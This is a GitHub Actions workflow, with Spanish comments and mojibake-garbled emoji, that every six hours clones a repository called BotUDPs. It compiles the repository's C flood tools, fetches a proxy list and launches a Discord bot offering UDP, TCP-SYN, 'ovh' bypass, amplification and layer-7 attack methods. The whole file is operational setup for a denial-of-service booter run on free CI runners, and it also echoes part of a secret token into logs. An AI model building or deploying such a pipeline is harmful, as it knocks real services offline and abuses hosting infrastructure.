name: ANDAHIJODEEPU

on:
  workflow_dispatch:
  schedule:
    - cron: '0 */6 * * *'

jobs:
  clone-compile-run:
    runs-on: ubuntu-latest

    steps:
    - name: üóëÔ∏è Limpiar directorio anterior
      run: |
        echo "Limpiando directorios anteriores..."
        rm -rf BotUDPs 2>/dev/null || true

    - name: üì• Clonar repositorio
      run: |
        echo "Clonando repositorio BotUDPs..."
        if ! git clone https://github.com/zJonch14/BotUDPs.git; then
          echo "‚ùå Error clonando, intentando clonado superficial..."
          git clone --depth 1 https://github.com/zJonch14/BotUDPs.git || exit 1
        fi

        cd BotUDPs
        echo "‚úÖ Repositorio clonado"
        echo "üìÅ Contenido:"
        ls -la

    - name: üêç Configurar Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.11'

    - name: üîß Instalar herramientas esenciales
      run: |
        echo "Instalando herramientas..."
        sudo apt-get update
        sudo apt-get install -y build-essential gcc g++ make libpcap-dev wget
        echo "‚úÖ Herramientas instaladas"

    - name: üì¶ Instalar discord.py
      run: |
        cd BotUDPs
        pip install discord.py
        echo "‚úÖ discord.py instalado"

    - name: Download and prepare proxy list
      run: |
        cd BotUDPs
        echo "=== Downloading Proxy List ==="
        wget -O proxy.txt "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=100&country=all&ssl=all&anonymity=all&skip=0&limit=2000"
        echo "=== Proxy List Downloaded ==="

    - name: üõ†Ô∏è COMPILAR CON CONTINUACI√ìN ANTE ERRORES
      run: |
        cd BotUDPs
        echo "========================================"
        echo "COMPILACI√ìN CON TOLERANCIA A FALLOS"
        echo "========================================"

        # Desactivar exit-on-error para este paso
        set +e

        echo "üìã Archivos .c encontrados:"
        find . -maxdepth 1 -name "*.c" -type f

        compiled=0
        failed=0

        for c_file in *.c; do
          [ -f "$c_file" ] || continue

          binary="${c_file%.c}"
          echo ""
          echo "üî® Compilando: $c_file ‚Üí $binary"

          # Intentar compilar cada archivo
          if gcc -O3 -pthread "$c_file" -o "$binary" 2>&1; then
            chmod +x "$binary"
            echo "  ‚úÖ $binary compilado exitosamente"
            ((compiled++))
          else
            echo "  ‚ùå Error compilando $binary"
            # Mostrar error espec√≠fico
            gcc -O3 -pthread "$c_file" -o "$binary" 2>&1 | head -5
            ((failed++))
          fi
        done

        echo ""
        echo "üî® Compilando tcp sin threads: tcp.c ‚Üí tcp"
        gcc -O3 tcp.c -o tcp
        chmod +x tcp
        echo ""

        echo ""
        echo "========================================"
        echo "RESUMEN DE COMPILACI√ìN:"
        echo "  ‚úÖ $compiled compilados exitosamente"
        echo "  ‚ùå $failed con errores"
        echo ""
        echo "üìÇ EJECUTABLES DISPONIBLES:"
        find . -maxdepth 1 -type f -executable ! -name "*.py" ! -name "*.go" ! -name "*.sh" | while read exe; do
          size=$(stat -c%s "$exe" 2>/dev/null || echo "?"")
          echo "  ‚úì $(basename "$exe") (${size} bytes)"
        done || echo "  Ning√∫n ejecutable encontrado"

        # Reactivar exit-on-error
        set -e

        echo "========================================"
        echo "‚ö†Ô∏è  Continuando aunque algunos archivos hayan fallado"


    - name: ü¶æ Configurar Go para scripts .go
      run: |
        cd BotUDPs

        # Solo si hay archivos .go
        if ls *.go >/dev/null 2>&1; then
          echo "ü¶æ Configurando Go..."

          # Instalar dependencias Go
          go get github.com/sandertv/go-raknet 2>/dev/null || echo "‚ö†Ô∏è  go-raknet opcional"

          echo "‚úÖ Go configurado"
        else
          echo "‚ö†Ô∏è  No hay archivos .go, omitiendo Go"
        fi

    - name: Prepare environment for https-request
      run: |
        cd BotUDPs  # Asegurarse de estar en el directorio del repo
        echo "=== Preparando entorno para https-request ==="
        python3 install.py

    - name: üöÄ EJECUTAR BOT CON KEYS
      env:
        DISCORD_TOKEN: ${{ secrets.KEYS }}  # ¬°IMPORTANTE! Esto pasa KEYS al bot.py
      run: |
        cd BotUDPs
        echo "========================================"
        echo "ü§ñ INICIANDO BOT UDP/TCP/AMP/L7"
        echo "========================================"

        # DEBUG: Verificar que KEYS se recibi√≥
        echo "üîç VERIFICANDO CONFIGURACI√ìN:"
        echo "   - Directorio: $(pwd)"
        echo "   - Archivo bot.py: $(ls -la bot.py 2>/dev/null && echo "‚úÖ" || echo "‚ùå")"
        echo "   - KEYS recibido: $([ -n "$DISCORD_TOKEN" ] && echo "‚úÖ (${#DISCORD_TOKEN} chars)" || echo "‚ùå VAC√çO")"

        if [ -z "$DISCORD_TOKEN" ]; then
          echo ""
          echo "‚ùå‚ùå‚ùå ERROR: DISCORD_TOKEN est√° VAC√çO ‚ùå‚ùå‚ùå"
          echo ""
          echo "SOLUCI√ìN INMEDIATA:"
          echo "1. El secret 'KEYS' NO est√° configurado o est√° vac√≠o"
          echo "2. Ve a: Settings ‚Üí Secrets and variables ‚Üí Actions"
          echo "3. Haz clic en 'KEYS' para verificar su contenido"
          echo "4. Si est√° vac√≠o, ed√≠talo y pega tu token"
          echo ""
          echo "Token de Discord debe tener ~59 caracteres como:"
          echo "pito"
          exit 1
        fi

        # Verificar formato del token
        if [ ${#DISCORD_TOKEN} -lt 50 ]; then
          echo "‚ö†Ô∏è  ADVERTENCIA: Token muy corto (${#DISCORD_TOKEN} chars)"
          echo "   Debe tener ~59 caracteres m√≠nimo"
        fi

        echo ""
        echo "‚úÖ CONFIGURACI√ìN CORRECTA"
        echo "   Token recibido: ${#DISCORD_TOKEN} caracteres"
        echo "   Vista previa: ${DISCORD_TOKEN:0:15}..."
        echo ""
        echo "üéÆ M√âTODOS DISPONIBLES:"

        # Mostrar m√©todos seg√∫n ejecutables
        for method in udp udphex udppps ovh udppayload udpbypass tcp tcp-syn httpsrequest; do
          [ -f "$method" ] && echo "   ‚Ä¢ $method"
        done

        [ -f "udpflood.go" ] && echo "   ‚Ä¢ udpflood (Go)"
        [ -f "raknet.go" ] && echo "   ‚Ä¢ raknet (Go)"

        echo ""
        echo "üöÄ INICIANDO bot.py..."
        echo "========================================"

        # Ejecutar bot.py (KEYS ya est√° como variable de entorno)
        python3 bot.py

        echo ""
        echo "========================================"
        echo "ü§ñ BOT FINALIZADO"
        echo "========================================"
